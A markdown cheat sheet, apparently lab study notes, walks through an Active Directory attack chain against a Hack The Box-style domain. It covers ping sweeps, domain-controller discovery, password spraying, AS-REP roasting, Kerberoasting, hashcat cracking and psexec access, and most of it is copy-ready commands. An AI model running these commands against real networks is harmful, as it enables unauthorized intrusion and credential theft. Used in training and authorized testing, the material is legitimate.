### Active Directory

#### How to identify alive hosts in netowrk ?
1. Run nmap ping sweep, Command: `nmap -r -sn 192.168.110.0/24`
2. Run nmap ping sweep, Command: `nmap -r -sP 192.168.110.0/24` 

#### How to identify Domain Controller (DC) ?
1. Most probably a DC would be having open PORTS e.g 53 and 88 which are not avbl to other Windows machines.
2. If you're in DC network, Command: `nmap -r -v --open -sC -sV -p53,88,389,636 <DC IP>`
3. If above command shows these ports **OPEN** ... You got **DC** !!!

### How to extract the underlying Windows OS via crackmapexec?
1. Command: `proxychains crackmapexec smb -d somedomain.htb -u user -p 'password' -dc-ip 192.168.110.52-55`

### How to know that username/password combination is valid - crakmapexec ?
1. If running follwing crackmapexec command against **DC** gives you **+** symbol, the **creds** are valid.
2. Command:  `proxychains crackmapexec smb -d somedomain.htb -u user -p 'password' -dc-ip 192.168.110.55`

### How to know that username/password combination is valid - kerbrute (password spray) ?
1. Command: `./kerbrute_linux_amd64 passwordspray --dc 192.168.110.55 -d somedomain.htb AD_users.txt 'password'`
   
#### Using impacket - To find all the usernames, email address etc?
1. Without username/password command: `proxychains GetADUsers.py somedomain.htb/ -no-pass -dc-ip 192.168.110.55`
2. With user/password of a valid domain user command: `proxychains GetADUsers.py somedomain.htb/ -no-pass -all -dc-ip 192.168.110.55`

#### Using impacket - Authentication Service Response (AS-REP) Roasting?
1. Highly unlikely today, as by default, in **Active Directory**, it is more likely the feature that **enables** this attack is **disabled**.
2. When DC Admin creates a user in DC, he has to explictly check option **Do not require Kerberos Pre-Authentication**.
3. Commamd: `proxychains GetNPUsers.py somedomain.htb/ -dc-ip 192.168.110.55 -usersfile ALL_AD_users.txt -format hashcat`
4. Command: `proxychains GetNPUsers.py somedomain.htb/someuser:'password' -dc-ip 192.168.110.55 -usersfile ALL_AD_users.txt -format hashcat`
5. If above command shows, *User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set*, this means, it doesn't work for this user. 
6. Crack the hashes, by running command: `hashcat -a 0 -m 18200 asrep-roast-hash.txt rockyou.txt`

#### Using impacket - Kerberoasting?
1. To get hashes, run command: `proxychains GetUserSPNs.py somedomain.htb/someuser:'password' -dc-ip 192.168.110.55 -request`
2. Cracking hashes: `hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt`

#### What to do if you have got valid user/password credentials ?
1. Lets assume Kerberoasting got successful, what to do next ?
2. Run cracmapexec, and if shows **Pwn3d!**, this means you can access that particular system.
3. Command: `proxychains crackmapexec smb 192.168.110.52-55 -u http_svc -p 'somepassword'`

#### Listing all the shares - crackmapexec ?
1. Command: `proxychains crackmapexec smb 192.168.110.52 -u http_svc -p 'somepassword' --shares`

#### Accessing that system e.g. we got creds after kerberoasting ?
1. Via psexec, command: `proxychains impacket-psexec somedomain.htb/http_svc:'somepassword'@192.168.110.52`
